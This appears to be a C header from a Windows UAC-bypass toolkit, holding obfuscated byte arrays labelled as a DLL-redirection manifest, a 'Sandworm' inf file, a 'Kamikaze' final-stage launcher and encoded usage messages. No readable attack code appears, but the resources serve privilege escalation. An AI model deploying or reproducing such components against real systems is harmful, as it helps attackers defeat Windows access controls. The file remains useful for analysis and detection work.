/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2019
*
*  TITLE:       ENCRESOURCE.H
*
*  VERSION:     3.22
*
*  DATE:        07 Nov 2019
*
*  Encoded string resources.
*
*  1) g_encodedManifestData - dll redirection manifest
*  2) g_encodedPackageData - simple update package
*  3) g_encodedSandwormInf - Sandworm inf file
*  4) g_encodedKamikazeFinal - Kamikaze final stage launcher
*  5) encoded string table elements
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

static const unsigned char g_encodedManifestData[1007] = {
    0x5D, 0xFD, 0xFC, 0x64, 0x7E, 0x04, 0x3E, 0xF5, 0x52, 0x33, 0xE8, 0x6C, 0x69, 0x33, 0x3B, 0x09,
    0x5E, 0xD0, 0xE6, 0xA3, 0x62, 0x60, 0x7E, 0x55, 0x10, 0x81, 0xBF, 0xC4, 0x7B, 0xAB, 0x6D, 0x44,
    0x07, 0xEF, 0xBC, 0x2E, 0x32, 0x57, 0x3C, 0xF1, 0x4E, 0x24, 0xE0, 0x6F, 0x68, 0x60, 0x79, 0x05,
    0x57, 0x99, 0xA4, 0xF0, 0x20, 0x31, 0x23, 0x37, 0x7E, 0xD4, 0xB0, 0xD0, 0x35, 0xE9, 0x75, 0x52,
    0x0D, 0xBB, 0x89, 0x03, 0x32, 0x04, 0x68, 0xB0, 0x58, 0x2D, 0xED, 0x6D, 0x74, 0x33, 0x3E, 0x4D,
    0x02, 0x8E, 0xFB, 0xF0, 0x64, 0x66, 0x78, 0x57, 0x15, 0x9B, 0xFC, 0xCE, 0x2F, 0xEF, 0x6A, 0x5F,
    0x12, 0xAD, 0xE2, 0x7D, 0x3F, 0x47, 0x27, 0xFD, 0x1A, 0x21, 0xF2, 0x6E, 0x29, 0x78, 0x2D, 0x1A,
    0x7D, 0xEA, 0xE1, 0xA3, 0x27, 0x2E, 0x65, 0x57, 0x18, 0x86, 0xA2, 0x99, 0x27, 0xFF, 0x75, 0x46,
    0x52, 0xFF, 0xA6, 0x7C, 0x60, 0x4A, 0x72, 0xE3, 0x43, 0x28, 0xE4, 0x6E, 0x66, 0x7D, 0x31, 0x55,
    0x19, 0x83, 0xB3, 0xEC, 0x74, 0x61, 0x7B, 0x4E, 0x59, 0x8B, 0xBE, 0xCE, 0x7C, 0xED, 0x6B, 0x5D,
    0x4F, 0xB4, 0xB7, 0x2B, 0x1F, 0x2E, 0x68, 0xB0, 0x00, 0x60, 0xEC, 0x62, 0x69, 0x67, 0x7A, 0x5D,
    0x03, 0x94, 0x97, 0xE6, 0x75, 0x7D, 0x74, 0x55, 0x1A, 0xD5, 0xF3, 0x92, 0x68, 0xBC, 0x3A, 0x3D,
    0x6B, 0xE2, 0xA4, 0x29, 0x32, 0x1A, 0x45, 0x9A, 0x00, 0x60, 0xA1, 0x3F, 0x73, 0x7C, 0x69, 0x4B,
    0x04, 0xA9, 0xAF, 0xE5, 0x68, 0x2E, 0x65, 0x57, 0x18, 0x86, 0xA2, 0x9E, 0x64, 0xF9, 0x6A, 0x5E,
    0x5B, 0xB1, 0xE7, 0x61, 0x77, 0x49, 0x29, 0xE3, 0x0D, 0x2D, 0xE8, 0x60, 0x75, 0x61, 0x6F, 0x57,
    0x16, 0x94, 0xEC, 0xE0, 0x68, 0x63, 0x27, 0x5B, 0x07, 0x85, 0xFF, 0xD5, 0x75, 0xAE, 0x26, 0x3D,
    0x6B, 0xE2, 0xA4, 0x29, 0x32, 0x18, 0x3B, 0xF5, 0x43, 0x35, 0xF3, 0x6A, 0x73, 0x77, 0x22, 0x35,
    0x7A, 0xC0, 0xE1, 0xA3, 0x27, 0x2E, 0x3D, 0x06, 0x06, 0x8D, 0xA0, 0xD6, 0x23, 0xFF, 0x6C, 0x55,
    0x05, 0x92, 0xF6, 0x60, 0x64, 0x4D, 0x24, 0xF5, 0x47, 0x25, 0xF2, 0x3D, 0x0A, 0x04, 0x3C, 0x18,
    0x50, 0xC0, 0xE1, 0xA3, 0x27, 0x2E, 0x21, 0x48, 0x11, 0x99, 0xA4, 0xC6, 0x35, 0xF8, 0x7D, 0x54,
    0x24, 0xBA, 0xE1, 0x6A, 0x67, 0x50, 0x21, 0xFF, 0x4E, 0x0C, 0xE4, 0x75, 0x62, 0x62, 0x11, 0x32,
    0x50, 0xC0, 0xE1, 0xA3, 0x27, 0x2E, 0x3D, 0x1A, 0x54, 0xC8, 0xF1, 0x83, 0x2A, 0xE9, 0x6E, 0x55,
    0x0D, 0xFF, 0xA6, 0x7B, 0x77, 0x55, 0x3D, 0xF9, 0x52, 0x25, 0xC0, 0x67, 0x6A, 0x67, 0x72, 0x51,
    0x03, 0x94, 0xB3, 0xE2, 0x73, 0x61, 0x6F, 0x18, 0x79, 0xE2, 0xF1, 0x83, 0x66, 0xAC, 0x38, 0x10,
    0x41, 0xE2, 0xA4, 0x29, 0x32, 0x04, 0x3D, 0xF9, 0x61, 0x23, 0xE2, 0x66, 0x74, 0x7D, 0x21, 0x1A,
    0x16, 0x81, 0xAD, 0xF0, 0x62, 0x2C, 0x10, 0x30, 0x54, 0xC8, 0xF1, 0x83, 0x66, 0xAC, 0x38, 0x10,
    0x41, 0xE2, 0xA4, 0x29, 0x3D, 0x1A, 0x45, 0x9A, 0x00, 0x60, 0xA1, 0x23, 0x27, 0x2E, 0x20, 0x17,
    0x02, 0x85, 0xB0, 0xF6, 0x62, 0x7D, 0x69, 0x5F, 0x10, 0xB8, 0xA3, 0xCA, 0x30, 0xE5, 0x74, 0x55,
    0x06, 0xA7, 0xF7, 0x37, 0x1F, 0x2E, 0x68, 0xB0, 0x00, 0x60, 0xBD, 0x2C, 0x74, 0x6B, 0x7F, 0x4D,
    0x02, 0x89, 0xB5, 0xFA, 0x39, 0x03, 0x17, 0x1A, 0x54, 0xD4, 0xFE, 0xD7, 0x34, 0xF9, 0x6B, 0x44,
    0x28, 0xAC, 0xE2, 0x66, 0x2C, 0x29, 0x42, 0xB0, 0x00, 0x7C, 0xE0, 0x70, 0x6A, 0x78, 0x2F, 0x02,
    0x11, 0x90, 0xB1, 0xEF, 0x6E, 0x6D, 0x7C, 0x4E, 0x1D, 0x87, 0xBF, 0x9D, 0x4B, 0x86, 0x38, 0x10,
    0x41, 0xE2, 0xB8, 0x68, 0x61, 0x49, 0x3E, 0xA3, 0x1A, 0x37, 0xE8, 0x6D, 0x63, 0x61, 0x6B, 0x4B,
    0x23, 0x85, 0xB5, 0xF7, 0x6E, 0x60, 0x7A, 0x49, 0x54, 0x90, 0xBC, 0xCF, 0x28, 0xFF, 0x25, 0x12,
    0x09, 0xB6, 0xF0, 0x79, 0x28, 0x0B, 0x67, 0xE3, 0x43, 0x28, 0xE4, 0x6E, 0x66, 0x7D, 0x32, 0x55,
    0x19, 0x83, 0xB3, 0xEC, 0x74, 0x61, 0x7B, 0x4E, 0x5A, 0x8B, 0xBE, 0xCE, 0x69, 0xDF, 0x55, 0x79,
    0x4E, 0xF0, 0xB4, 0x39, 0x27, 0x0B, 0x1F, 0xF9, 0x4E, 0x24, 0xEE, 0x74, 0x74, 0x5D, 0x79, 0x4C,
    0x04, 0x89, 0xAF, 0xE4, 0x74, 0x2C, 0x23, 0x37, 0x7E, 0xC8, 0xF1, 0x83, 0x66, 0xAC, 0x38, 0x0C,
    0x00, 0xB7, 0xF0, 0x66, 0x57, 0x48, 0x2D, 0xE6, 0x41, 0x34, 0xE4, 0x3D, 0x73, 0x7C, 0x69, 0x5D,
    0x4C, 0xCF, 0xA0, 0xF6, 0x73, 0x61, 0x58, 0x56, 0x11, 0x9E, 0xB0, 0xD7, 0x23, 0xB2, 0x15, 0x3A,
    0x41, 0xE2, 0xA4, 0x29, 0x2E, 0x0B, 0x29, 0xE3, 0x4D, 0x36, 0xB2, 0x39, 0x70, 0x67, 0x72, 0x5C,
    0x1F, 0x97, 0xB2, 0xD0, 0x62, 0x7A, 0x69, 0x53, 0x1A, 0x8F, 0xA2, 0x9D, 0x4B, 0x86, 0x38, 0x10,
    0x5D, 0xED, 0xE5, 0x7A, 0x7F, 0x52, 0x7B, 0xAA, 0x41, 0x30, 0xF1, 0x6F, 0x6E, 0x6D, 0x7D, 0x4C,
    0x19, 0x8F, 0xAF, 0xBD, 0x0A, 0x04, 0x3D, 0x06, 0x55, 0xC5, 0xFC, 0xAE, 0x4C, 0xAC, 0x38, 0x10,
    0x41, 0xE2, 0xA4, 0x50, 0x7D, 0x51, 0x3A, 0xB0, 0x02, 0x24, 0xE4, 0x65, 0x62, 0x60, 0x7F, 0x5D,
    0x5D, 0x89, 0xAF, 0xAE, 0x63, 0x6B, 0x6D, 0x4E, 0x1C, 0xC8, 0xB0, 0xD3, 0x36, 0xFE, 0x77, 0x51,
    0x02, 0xAA, 0xA6, 0x29, 0x7B, 0x57, 0x68, 0xF1, 0x43, 0x34, 0xF4, 0x62, 0x6B, 0x62, 0x65, 0x18,
    0x09, 0x85, 0xB5, 0xA3, 0x66, 0x60, 0x72, 0x4E, 0x1C, 0x8D, 0xA3, 0xAE, 0x4C, 0xAC, 0x38, 0x10,
    0x41, 0xE2, 0xA4, 0x7C, 0x7C, 0x40, 0x27, 0xF3, 0x55, 0x2D, 0xE4, 0x6D, 0x73, 0x6B, 0x78, 0x18,
    0x12, 0x81, 0xA2, 0xE8, 0x63, 0x61, 0x72, 0x48, 0x5A, 0xC8, 0x98, 0x83, 0x35, 0xE5, 0x76, 0x53,
    0x04, 0xB0, 0xE1, 0x65, 0x6B, 0x04, 0x20, 0xFF, 0x50, 0x25, 0xA1, 0x7A, 0x68, 0x7B, 0x3C, 0x4F,
    0x19, 0x8C, 0xAD, 0xA3, 0x69, 0x6B, 0x6B, 0x5F, 0x06, 0xE5, 0xDB, 0x83, 0x66, 0xAC, 0x38, 0x10,
    0x41, 0xA6, 0xEB, 0x29, 0x73, 0x4A, 0x31, 0xE4, 0x48, 0x29, 0xEF, 0x64, 0x27, 0x63, 0x73, 0x4A,
    0x15, 0xC0, 0xA2, 0xEC, 0x6A, 0x7E, 0x71, 0x5F, 0x0C, 0xC8, 0xA5, 0xCB, 0x27, 0xE2, 0x38, 0x53,
    0x0E, 0xA6, 0xED, 0x67, 0x75, 0x04, 0x1C, 0xF5, 0x54, 0x32, 0xE8, 0x70, 0x29, 0x03, 0x16, 0x18,
    0x50, 0xCD, 0xEC, 0xBD, 0x0A, 0x04, 0x3D, 0x1A, 0x48, 0x8E, 0xB8, 0xCF, 0x23, 0x81, 0x12, 0x10,
    0x41, 0xE2, 0xA4, 0x29, 0x32, 0x48, 0x27, 0xF1, 0x44, 0x06, 0xF3, 0x6C, 0x6A, 0x33, 0x3E, 0x1D,
    0x03, 0x99, 0xB2, 0xF7, 0x62, 0x63, 0x6F, 0x55, 0x1B, 0x9C, 0xF4, 0xFF, 0x35, 0xF5, 0x6B, 0x44,
    0x04, 0xAF, 0xB7, 0x3B, 0x4E, 0x57, 0x31, 0xE3, 0x50, 0x32, 0xE4, 0x73, 0x5B, 0x6D, 0x6E, 0x41,
    0x00, 0x94, 0xA3, 0xE2, 0x74, 0x6B, 0x33, 0x7E, 0x38, 0xA4, 0xF3, 0xAE, 0x4C, 0xAC, 0x38, 0x10,
    0x41, 0xE2, 0xA4, 0x67, 0x73, 0x49, 0x2D, 0xAD, 0x02, 0x23, 0xF3, 0x7A, 0x77, 0x7A, 0x7E, 0x59,
    0x03, 0x85, 0xEF, 0xC7, 0x4B, 0x42, 0x3F, 0x37, 0x7E, 0xC8, 0xF1, 0x83, 0x66, 0xAC, 0x38, 0x1F,
    0x5F, 0xCF, 0x8E, 0x29, 0x2E, 0x0B, 0x29, 0xE3, 0x53, 0x25, 0xEC, 0x61, 0x6B, 0x77, 0x22
};

static const unsigned char g_encodedPackageData[444] = {
    0x5D, 0xFD, 0xFC, 0x64, 0x7E, 0x04, 0x3E, 0xF5, 0x52, 0x33, 0xE8, 0x6C, 0x69, 0x33, 0x3E, 0x09,
    0x5E, 0xD0, 0xE3, 0xA3, 0x62, 0x60, 0x7E, 0x55, 0x10, 0x81, 0xBF, 0xC4, 0x7B, 0xAE, 0x6D, 0x44,
    0x07, 0xEF, 0xBC, 0x2B, 0x2D, 0x1A, 0x45, 0x9A, 0x1C, 0x35, 0xEF, 0x62, 0x73, 0x7A, 0x79, 0x56,
    0x14, 0xC0, 0xB9, 0xEE, 0x6B, 0x60, 0x6E, 0x07, 0x56, 0x9D, 0xA3, 0xCD, 0x7C, 0xFF, 0x7B, 0x58,
    0x04, 0xAF, 0xE5, 0x7A, 0x3F, 0x49, 0x21, 0xF3, 0x52, 0x2F, 0xF2, 0x6C, 0x61, 0x7A, 0x31, 0x5B,
    0x1F, 0x8D, 0xFB, 0xF6, 0x69, 0x6F, 0x69, 0x4E, 0x11, 0x86, 0xB5, 0x81, 0x78, 0x81, 0x12, 0x10,
    0x41, 0xE2, 0xA4, 0x35, 0x61, 0x41, 0x3A, 0xE6, 0x49, 0x23, 0xE8, 0x6D, 0x60, 0x30, 0x11, 0x32,
    0x50, 0xC0, 0xE1, 0xA3, 0x27, 0x2E, 0x3D, 0x1A, 0x48, 0x98, 0xB0, 0xC0, 0x2D, 0xED, 0x7F, 0x55,
    0x41, 0xA3, 0xE7, 0x7D, 0x7B, 0x4B, 0x26, 0xAD, 0x02, 0x29, 0xEF, 0x70, 0x73, 0x6F, 0x70, 0x54,
    0x52, 0xDE, 0xCC, 0x89, 0x27, 0x2E, 0x3D, 0x1A, 0x54, 0xC8, 0xF1, 0x83, 0x66, 0xAC, 0x38, 0x10,
    0x5D, 0xA3, 0xF7, 0x7A, 0x77, 0x49, 0x2A, 0xFC, 0x59, 0x09, 0xE5, 0x66, 0x69, 0x7A, 0x75, 0x4C,
    0x09, 0xC0, 0xE1, 0xED, 0x66, 0x63, 0x78, 0x07, 0x56, 0xB8, 0xB0, 0xC0, 0x2D, 0xED, 0x7F, 0x55,
    0x3E, 0xF3, 0xDB, 0x6F, 0x7D, 0x56, 0x17, 0xDB, 0x62, 0x79, 0xB3, 0x3A, 0x30, 0x38, 0x2D, 0x1A,
    0x50, 0x96, 0xA4, 0xF1, 0x74, 0x67, 0x72, 0x54, 0x49, 0xCA, 0xE7, 0x8D, 0x76, 0xA2, 0x29, 0x1E,
    0x50, 0xE0, 0xA4, 0x65, 0x73, 0x4A, 0x2F, 0xE5, 0x41, 0x27, 0xE4, 0x3E, 0x25, 0x60, 0x79, 0x4D,
    0x04, 0x92, 0xA0, 0xEF, 0x25, 0x2E, 0x6D, 0x48, 0x1B, 0x8B, 0xB4, 0xD0, 0x35, 0xE3, 0x6A, 0x71,
    0x13, 0xA1, 0xEC, 0x60, 0x66, 0x41, 0x2B, 0xE4, 0x55, 0x32, 0xE4, 0x3E, 0x25, 0x76, 0x24, 0x0E,
    0x52, 0xC0, 0xB1, 0xF6, 0x65, 0x62, 0x74, 0x59, 0x3F, 0x8D, 0xA8, 0xF7, 0x29, 0xE7, 0x7D, 0x5E,
    0x5C, 0xE0, 0xB7, 0x38, 0x70, 0x42, 0x7B, 0xA8, 0x15, 0x76, 0xE0, 0x67, 0x34, 0x38, 0x28, 0x5D,
    0x43, 0xD5, 0xE3, 0xAC, 0x39, 0x03, 0x17, 0x1A, 0x54, 0xC8, 0xF1, 0x83, 0x66, 0xAC, 0x38, 0x10,
    0x41, 0xE2, 0xA4, 0x35, 0x61, 0x4B, 0x3D, 0xE2, 0x43, 0x25, 0xA1, 0x6F, 0x68, 0x6D, 0x7D, 0x4C,
    0x19, 0x8F, 0xAF, 0xBE, 0x25, 0x2B, 0x7E, 0x55, 0x1A, 0x8E, 0xB8, 0xC4, 0x35, 0xE9, 0x6C, 0x42,
    0x0E, 0xAD, 0xF0, 0x2C, 0x4E, 0x73, 0x21, 0xFE, 0x44, 0x2F, 0xF6, 0x70, 0x31, 0x20, 0x2C, 0x15,
    0x3B, 0xA2, 0xF8, 0xB1, 0x3E, 0x39, 0x2B, 0x0B, 0x59, 0x90, 0xE9, 0x95, 0x68, 0xCF, 0x59, 0x72,
    0x43, 0xE2, 0xAB, 0x37, 0x1F, 0x2E, 0x68, 0xB0, 0x00, 0x60, 0xA1, 0x23, 0x27, 0x2E, 0x20, 0x17,
    0x00, 0x81, 0xA2, 0xE8, 0x66, 0x69, 0x78, 0x04, 0x79, 0xE2, 0xF1, 0x83, 0x66, 0xAC, 0x38, 0x0C,
    0x4E, 0xB1, 0xE1, 0x7B, 0x64, 0x4D, 0x2B, 0xF9, 0x4E, 0x27, 0xBF, 0x0E, 0x0D, 0x32, 0x33, 0x4D,
    0x1E, 0x81, 0xB5, 0xF7, 0x62, 0x60, 0x79, 0x04, 0x79, 0xE2, 0xDC, 0xA9
};

static const unsigned char g_encodedSandwormInf[319] = {
    0x5A, 0xE2, 0xB2, 0x38, 0x2A, 0x1C, 0x7B, 0xBE, 0x69, 0x0E, 0xC7, 0x0E, 0x0D, 0x35, 0x3C, 0x7B,
    0x1F, 0x90, 0xB8, 0xF1, 0x6E, 0x69, 0x75, 0x4E, 0x54, 0xC0, 0xB2, 0x8A, 0x66, 0xC1, 0x71, 0x53,
    0x13, 0xAD, 0xF7, 0x66, 0x74, 0x50, 0x68, 0xD3, 0x4F, 0x32, 0xF1, 0x6C, 0x75, 0x6F, 0x68, 0x51,
    0x1F, 0x8E, 0xEF, 0xA3, 0x27, 0x4F, 0x71, 0x56, 0x54, 0x9A, 0xB8, 0xC4, 0x2E, 0xF8, 0x6B, 0x10,
    0x13, 0xA7, 0xF7, 0x6C, 0x60, 0x52, 0x2D, 0xF4, 0x0E, 0x4D, 0x8B, 0x0E, 0x0D, 0x55, 0x4A, 0x5D,
    0x02, 0x93, 0xA8, 0xEC, 0x69, 0x53, 0x10, 0x30, 0x27, 0x81, 0xB6, 0xCD, 0x27, 0xF8, 0x6D, 0x42,
    0x04, 0xFF, 0xA6, 0x2D, 0x51, 0x6C, 0x01, 0xD3, 0x61, 0x07, 0xCE, 0x27, 0x25, 0x03, 0x16, 0x7B,
    0x1C, 0x81, 0xB2, 0xF0, 0x3A, 0x38, 0x2C, 0x02, 0x4C, 0xDB, 0xDC, 0xA9, 0x05, 0xE0, 0x79, 0x43,
    0x12, 0x85, 0xF1, 0x60, 0x76, 0x19, 0x33, 0xA7, 0x65, 0x02, 0xC4, 0x45, 0x45, 0x4D, 0x2C, 0x15,
    0x43, 0xD2, 0xF1, 0xB3, 0x2A, 0x3F, 0x2C, 0x7E, 0x46, 0xC5, 0x93, 0x97, 0x05, 0xBE, 0x35, 0x00,
    0x51, 0x83, 0xB4, 0x4A, 0x2B, 0x12, 0x71, 0xA7, 0x64, 0x70, 0xB6, 0x7E, 0x0A, 0x04, 0x4C, 0x4A,
    0x1F, 0x96, 0xA8, 0xE7, 0x62, 0x7C, 0x20, 0x1F, 0x39, 0x9B, 0xB7, 0xD7, 0x63, 0x81, 0x12, 0x74,
    0x13, 0xAB, 0xF2, 0x6C, 0x60, 0x72, 0x2D, 0xE2, 0x1D, 0x71, 0xB7, 0x2C, 0x35, 0x3F, 0x33, 0x0A,
    0x40, 0xD0, 0xF7, 0xAF, 0x31, 0x20, 0x2C, 0x14, 0x43, 0xDE, 0xE1, 0x93, 0x68, 0xBD, 0x2E, 0x03,
    0x59, 0xF7, 0x89, 0x03, 0x1F, 0x2E, 0x13, 0xD4, 0x45, 0x33, 0xF5, 0x6A, 0x69, 0x6F, 0x68, 0x51,
    0x1F, 0x8E, 0x85, 0xEA, 0x75, 0x7D, 0x40, 0x37, 0x7E, 0xAC, 0xB4, 0xC5, 0x27, 0xF9, 0x74, 0x44,
    0x25, 0xA7, 0xF7, 0x7D, 0x56, 0x4D, 0x3A, 0xB0, 0x1D, 0x60, 0xB0, 0x32, 0x0A, 0x04, 0x11, 0x32,
    0x2B, 0xA4, 0xA4, 0xE5, 0x66, 0x7B, 0x71, 0x4E, 0x3D, 0x86, 0xA2, 0xD7, 0x27, 0xE0, 0x74, 0x6D,
    0x6C, 0xC8, 0xC7, 0x66, 0x62, 0x5D, 0x0E, 0xF9, 0x4C, 0x25, 0xF2, 0x3E, 0x47, 0x60, 0x68, 0x4F,
    0x14, 0x82, 0xAD, 0xEA, 0x65, 0x20, 0x79, 0x56, 0x18, 0xE5, 0xDB, 0xAE, 0x4C, 0x81, 0x12
};

static const unsigned char g_encodedKamikazeFinal[129] = {
    0x46, 0x9C, 0x9D, 0xBE, 0xCA, 0x73, 0xA6, 0x57, 0x04, 0xB2, 0xD4, 0x65, 0x8A, 0x1E, 0xB8, 0xC4,
    0x04, 0xAA, 0xC1, 0x55, 0xB3, 0xD5, 0x2E, 0xD0, 0x19, 0xB8, 0xCC, 0x37, 0x99, 0x2A, 0xA6, 0xD8,
    0x19, 0x81, 0x9D, 0xB6, 0xF5, 0x25, 0xFF, 0x59, 0x07, 0x95, 0xC2, 0x36, 0xDB, 0x0C, 0xB5, 0xD2,
    0x45, 0xF8, 0x90, 0x1F, 0xB3, 0xC0, 0x2A, 0x90, 0x37, 0x8A, 0xCB, 0x2E, 0xD5, 0x1A, 0xB5, 0xD4,
    0x54, 0x91, 0x91, 0xB6, 0x84, 0x61, 0xBA, 0x17, 0x4E, 0xA5, 0xD4, 0x28, 0xC2, 0x08, 0xB6, 0xD2,
    0x1F, 0xB3, 0xC3, 0x0E, 0xF3, 0x8F, 0x76, 0x95, 0x49, 0xF4, 0x81, 0x7B, 0x95, 0x3D, 0xBB, 0xCE,
    0x0E, 0x9B, 0x9B, 0xB6, 0xC2, 0x6F, 0xB3, 0x0E, 0x57, 0xF9, 0xDE, 0x38, 0xC4, 0x04, 0xAB, 0xC2,
    0x53, 0xE6, 0x9A, 0x09, 0xB9, 0xC9, 0x23, 0x8B, 0x57, 0xF9, 0xC5, 0x2F, 0xDA, 0x03, 0xE0, 0xB0,
    0x70
};

static const unsigned char B_USAGE_HELP[100] = {
    0xD6, 0x55, 0xE2, 0x63, 0xE8, 0x63, 0x10, 0x89, 0xD6, 0x5D, 0xD9, 0x54, 0xE0, 0x53, 0x5E, 0xD3,
    0xA2, 0x11, 0x44, 0xB1, 0xBC, 0x2F, 0x62, 0xD7, 0xC1, 0x4A, 0x27, 0xAE, 0x7A, 0x15, 0x58, 0xB9,
    0x85, 0x26, 0x21, 0xC4, 0xB3, 0x50, 0x85, 0xEC, 0xB0, 0x47, 0x75, 0xE0, 0xC5, 0x72, 0xA4, 0xF5,
    0x9A, 0x49, 0x3B, 0xAA, 0x7F, 0x14, 0x4F, 0xC2, 0x9A, 0xE1, 0x47, 0xAE, 0xB1, 0x06, 0x61, 0xD8,
    0x78, 0xB7, 0xDA, 0x97, 0x87, 0xC4, 0x1A, 0xD3, 0x6C, 0xA3, 0xFF, 0xBA, 0x7D, 0xBA, 0x2F, 0xE6,
    0x62, 0x91, 0x12, 0x5F, 0x38, 0x03, 0x01, 0xAC, 0x97, 0xC0, 0xF3, 0x9E, 0x4D, 0x0A, 0x18, 0xBD,
    0x0E, 0xED, 0x20, 0x81
};

static const unsigned char B_USAGE_UAC_REQUIRED[70] = {
    0xD1, 0x52, 0x00, 0x7D, 0xF6, 0x71, 0x18, 0x91, 0xDC, 0x53, 0xFE, 0x77, 0xBB, 0x38, 0x65, 0xEC,
    0x8E, 0x1D, 0x30, 0xBD, 0xAB, 0x40, 0x7E, 0xEB, 0x98, 0xFF, 0xB5, 0x20, 0x6F, 0xE4, 0xED, 0x64,
    0x0D, 0xAE, 0xB0, 0x0D, 0xE7, 0x8C, 0xD7, 0x3A, 0xE4, 0x7B, 0x01, 0x5C, 0x5C, 0xBF, 0x11, 0xA8,
    0x37, 0xA8, 0x0B, 0x5A, 0x06, 0x99, 0xE8, 0x39, 0xF4, 0x8B, 0xD0, 0x25, 0x20, 0x9B, 0xEA, 0x4F,
    0xFF, 0x40, 0x4E, 0x0B, 0x5D, 0x22
};

static const unsigned char B_USAGE_ADMIN_REQUIRED[84] = {
    0xC2, 0x41, 0xE7, 0x66, 0xF5, 0x72, 0x1F, 0x9A, 0xE0, 0x57, 0x3D, 0xB8, 0xBB, 0x38, 0x67, 0xEA,
    0x93, 0x24, 0x63, 0xD2, 0xA9, 0x3E, 0x7A, 0xEF, 0xA3, 0x2C, 0x02, 0x8B, 0x5A, 0xF5, 0x34, 0x9D,
    0x35, 0x96, 0xE0, 0x7D, 0x21, 0x7E, 0xB0, 0x51, 0x12, 0x69, 0x98, 0x3D, 0x32, 0x85, 0xE7, 0x52,
    0xD5, 0x86, 0xBC, 0x29, 0x35, 0xEA, 0x04, 0x8D, 0x24, 0xDB, 0xF8, 0x7D, 0x3E, 0xF9, 0x0D, 0xAC,
    0xD2, 0x11, 0x7D, 0x3C, 0xF3, 0x38, 0x85, 0x48, 0xEB, 0x24, 0x75, 0x3C, 0x0A, 0x4D, 0x9C, 0x59,
    0xDD, 0x0E, 0x4E, 0x1B
};
